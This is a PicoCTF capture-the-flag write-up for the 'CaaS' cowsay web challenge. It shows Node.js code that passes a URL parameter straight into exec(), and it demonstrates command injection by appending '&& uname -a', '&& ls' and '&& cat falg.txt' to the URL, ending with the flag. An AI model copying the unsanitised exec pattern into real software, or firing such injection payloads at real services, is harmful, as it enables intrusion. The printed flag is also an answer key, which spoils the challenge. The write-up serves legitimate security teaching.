# Hey there


In this writeup, ill show how to exploit a vulnerable web service called CaaS (Cowsay as a Service) found in [PicoCTF practice](https://play.picoctf.org/practice/challenge/202).
## Challenge Overview

I am provided with two pieces of information:

1. The server-side code for the endpoint
2. The home page

Let's start by examining each of these in detail.

### Server-side Code


```javascript
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```

This code takes a message as a parameter and passes it to the `cowsay` program.

### Home Page

The home page gives us an idea of how the service is supposed to be used:

![CaaS Home Page](https://github.com/user-attachments/assets/ad09898b-cd7e-4a5e-a267-843d6456655e)

## Vulnerability Analysis

The vulnerability in this application lies in this line of code:

```javascript
exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
```

This line takes the user's input (`req.params.message`) and directly inserts it into a command that's executed on the server.
We can exploit this by doing a couple of things shown below.
## Exploitation

### Step 1: Confirming the Vulnerability

To confirm that we can indeed inject commands, let's try to run the `uname -a` command, which will give us information about the system. 
To do this, we put the cowsay input, and then `&&` with our desired command.

URL: `https://caas.mars.picoctf.net/cowsay/f && uname -a`

Result:
```
 ___
< f >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Linux main-98c85f565-m5pbn 5.11.0-1022-aws #23~20.04.1-Ubuntu SMP Mon Nov 15 14:03:19 UTC 2021 x86_64 GNU/Linux
```

This output confirms that we've successfully injected a command.

### Step 2: Exploring the File System

Now that we've confirmed the vulnerability, let's see what files are in the current directory:

URL: `https://caas.mars.picoctf.net/cowsay/f && ls`

Result:
```
 ___
< f >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```

Interesting! We can see a file named `falg.txt`, which is likely a misspelling of "flag.txt". This is probably where our flag is stored.

### Step 3: Retrieving the Flag

Let's read the contents of `falg.txt`:

URL: `https://caas.mars.picoctf.net/cowsay/f && cat falg.txt`

Result:
```
 ___
< f >
 ---
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

And we've successfully retrieved the flag.

## The Flag

The flag for this challenge is:
`picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}`
Moral of the story, Don't do this for ASCII art.
Thanks for reading!
